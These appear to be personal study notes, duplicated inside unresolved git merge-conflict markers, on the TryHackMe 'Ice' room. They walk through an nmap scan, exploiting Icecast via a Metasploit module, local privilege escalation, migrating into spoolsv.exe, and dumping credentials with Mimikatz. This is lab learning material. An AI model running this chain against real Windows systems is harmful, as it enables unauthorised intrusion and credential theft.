<<<<<<< HEAD
- hacking Windows server
- https://tryhackme.com/room/ice

- nmap scan `nmap -sS -sV -p- <IP>`
	- 135: msrpc
	- 139: netbios-ssn
	- 445: microsoft-ds (WORKGROUP)
	- 3389: tcpwrapped
	- 5357: http
		- HTTPAPI 2.0 (SSDP/UPnP)
	- 8000: http
		- Icecast streaming media server
	- 49152, 49153, 49154, 49158, 49159, 49160: msrpc
	- Service info:
		- Host: DARK-PC; cpe:/o\:microsoft:windows 

- gaining access throught Icecast and escalating privileges
	- research on vulnerabilities
		- https://www.cvedetails.com/cve/CVE-2004-1561/ → has Metasploit exploit
	- Metasploit
		- → run `exploit/windows/http/icecast_header`
	- Meterpreter
		- sessionId: session 1
		- who is running Icecast? (current user) → `getuid` → Dark
		- `sysinfo` → get info about build,...
		- `run post/multi/recon/local\_exploit\_suggester`
			- can run several minutes
			- will give us potential exploits
				- exploit/windows/local/bypassuac_eventvwr
				- exploit/windows/local/ikeext_service
				- exploit/windows/local/ms10_092_schelevator
				- exploit/windows/local/ms13_053_schlamperei
				- exploit/windows/local/ms13_081_track_popup_menu
				- exploit/windows/local/ms14_058_track_popup_menu
				- exploit/windows/local/ms15_051_client_copy_image
				- exploit/windows/local/ntusermndragover
				- exploit/windows/local/ppr_flatten_rec:
		- background Meterpeter and start running exploits
		- if the exploit is succesfull you get another session
			- get to that session `sessions <sessionId>`
			- check permissions `getprivs`

- start looting
	- show running processes `ps`
	- find one that is running on the same architecture as lsass service
		- → spoolsv.exe ~ printer
	- switch to another process `migrate -N <process_name>`
		- → now we have full admin permission
	- run Mimikatz `load kiwi`
		- retrieve all creds `creds_all`

- post-exploitation
=======
- hacking Windows server
- https://tryhackme.com/room/ice

- nmap scan `nmap -sS -sV -p- <IP>`
	- 135: msrpc
	- 139: netbios-ssn
	- 445: microsoft-ds (WORKGROUP)
	- 3389: tcpwrapped
	- 5357: http
		- HTTPAPI 2.0 (SSDP/UPnP)
	- 8000: http
		- Icecast streaming media server
	- 49152, 49153, 49154, 49158, 49159, 49160: msrpc
	- Service info:
		- Host: DARK-PC; cpe:/o\:microsoft:windows 

- gaining access throught Icecast and escalating privileges
	- research on vulnerabilities
		- https://www.cvedetails.com/cve/CVE-2004-1561/ → has Metasploit exploit
	- Metasploit
		- → run `exploit/windows/http/icecast_header`
	- Meterpreter
		- sessionId: session 1
		- who is running Icecast? (current user) → `getuid` → Dark
		- `sysinfo` → get info about build,...
		- `run post/multi/recon/local\_exploit\_suggester`
			- can run several minutes
			- will give us potential exploits
				- exploit/windows/local/bypassuac_eventvwr
				- exploit/windows/local/ikeext_service
				- exploit/windows/local/ms10_092_schelevator
				- exploit/windows/local/ms13_053_schlamperei
				- exploit/windows/local/ms13_081_track_popup_menu
				- exploit/windows/local/ms14_058_track_popup_menu
				- exploit/windows/local/ms15_051_client_copy_image
				- exploit/windows/local/ntusermndragover
				- exploit/windows/local/ppr_flatten_rec:
		- background Meterpeter and start running exploits
		- if the exploit is succesfull you get another session
			- get to that session `sessions <sessionId>`
			- check permissions `getprivs`

- start looting
	- show running processes `ps`
	- find one that is running on the same architecture as lsass service
		- → spoolsv.exe ~ printer
	- switch to another process `migrate -N <process_name>`
		- → now we have full admin permission
	- run Mimikatz `load kiwi`
		- retrieve all creds `creds_all`

- post-exploitation
>>>>>>> ed86870e047cc27b656f2f20735dd248c5953b5d
	- what can you do with mimikatz